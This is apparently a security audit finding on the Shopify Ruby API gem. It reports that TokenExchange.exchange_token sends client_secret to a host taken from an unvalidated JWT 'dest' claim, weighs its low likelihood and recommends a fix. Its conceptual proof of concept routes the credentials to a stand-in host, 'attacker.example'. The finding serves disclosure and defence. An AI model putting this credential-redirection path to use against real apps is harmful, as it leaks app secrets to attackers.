Found the key issue: `ShopifyAPI::Auth::TokenExchange.exchange_token` derives the target shop/host solely from the JWT `dest` claim without ever passing it through `Utils::ShopValidator.sanitize!`, unlike every other credential-sending method in this gem.

### Title
Missing shop-domain allow-list check on JWT `dest` claim lets attacker-controlled `dest` values direct `client_secret` to arbitrary hosts in `TokenExchange.exchange_token` - (File: lib/shopify_api/auth/token_exchange.rb)

### Summary
`ShopifyAPI::Auth::JwtPayload` verifies the JWT signature and the `aud` claim against `Context.api_key`, but it never validates that the `dest` claim is a real, trusted Shopify domain [1](#0-0) . `TokenExchange.exchange_token` then takes that unchecked value (`jwt_payload.shop`) and uses it directly as the host to which the request carrying `client_id`/`client_secret` is sent [2](#0-1) . Every sibling method that builds a similar credential-bearing request (`ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, `TokenExchange.migrate_to_expiring_token`) runs the shop through `Utils::ShopValidator.sanitize!`, which restricts the destination host to `TRUSTED_SHOPIFY_DOMAINS` [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5) . `exchange_token` is the sole exception: it deliberately switched from a caller-supplied `shop` to a JWT-derived `dest_shop`, but omitted the corresponding `sanitize!` call [7](#0-6) , as confirmed by the changelog entry describing this exact change [8](#0-7) .

### Finding Description
The binding that should hold is: `host receiving client_secret == a domain within TRUSTED_SHOPIFY_DOMAINS (or the app's own myshopify_domain)`. The equality is broken because `exchange_token` uses `Session.new(shop: dest_shop)` (unsanitized) to build the `Clients::HttpClient` base path, and that client's request target is derived from `session.shop` [9](#0-8) . `JwtPayload#shop` simply strips the literal substring `"https://"` from the `dest` claim with no format or domain check: `@dest.gsub("https://", "")` [10](#0-9) . `JwtPayload#initialize` only verifies the token's HMAC signature and the `aud` claim; it never checks that `dest` matches `TRUSTED_SHOPIFY_DOMAINS` the way `ShopValidator.sanitize!` does [11](#0-10) .

Note on likelihood/reachability: because the JWT must be signed with the app's own `api_secret_key` (verified in `decode_token`), a truly unprivileged internet user without that secret cannot forge an arbitrary `dest` value and cannot exploit this path directly — this is the missing defense-in-depth layer that the rest of the codebase (and PR #1443) explicitly added everywhere else, but skipped here. I was unable to verify from this gem's code alone whether Shopify's own session-token issuance can ever be induced to set `dest` to a non-myshopify value reachable by a network attacker (e.g., via a compromised/rogue custom-domain flow) — that would require host-application or Shopify-platform behavior outside `lib/shopify_api/**`, which is out of scope to confirm here.

### Impact Explanation
If `dest` can ever contain a non-trusted-domain value (through any means outside this gem's control, e.g. a malformed/relayed session token), `exchange_token` would send the app's `client_id` and `client_secret` to that host — credential leakage of the app's `client_secret` to an attacker-controlled server, i.e. SSRF carrying the app's credentials (High impact per the given classification).

### Likelihood Explanation
Low-to-moderate under the stated threat model: exploitation requires the `dest` claim to actually contain a value outside `TRUSTED_SHOPIFY_DOMAINS`, and only Shopify's platform (holder of the app's secret) issues valid session tokens, so a pure "unprivileged internet user" cannot construct a valid forged JWT. Likelihood is nonetheless elevated relative to the sibling methods because this is the only credential-sending path in the gem lacking the `ShopValidator.sanitize!` allow-list check that all analogous code paths use.

### Recommendation
Apply `Utils::ShopValidator.sanitize!(dest_shop)` (or equivalent) to `jwt_payload.shop` in `TokenExchange.exchange_token` before constructing `shop_session`/`Clients::HttpClient`, consistent with `ClientCredentials.client_credentials`, `RefreshToken.refresh_access_token`, and `TokenExchange.migrate_to_expiring_token`, so the destination host is always constrained to the trusted Shopify domain list regardless of the raw `dest` claim value.

### Proof of Concept
Not independently reproducible as a live exploit from this gem's code alone, since it requires a JWT `dest` claim containing a non-trusted host while still being validly signed with the app's `api_secret_key` — something only the app/Shopify can produce. Conceptually:
1. Obtain (or induce production of) a session token whose `dest` claim is `"https://attacker.example"` but which is still signed with the app's `api_secret_key`.
2. Call `ShopifyAPI::Auth::TokenExchange.exchange_token(session_token: token, requested_token_type: ...)`.
3. `JwtPayload.new(token)` passes signature/`aud` checks; `dest_shop` becomes `"attacker.example"` unchecked [10](#0-9) .
4. `Clients::HttpClient.new(session: Session.new(shop: "attacker.example"), base_path: "/admin/oauth")` sends a POST containing `client_id`/`client_secret` to `https://attacker.example/admin/oauth/access_token` [12](#0-11) .
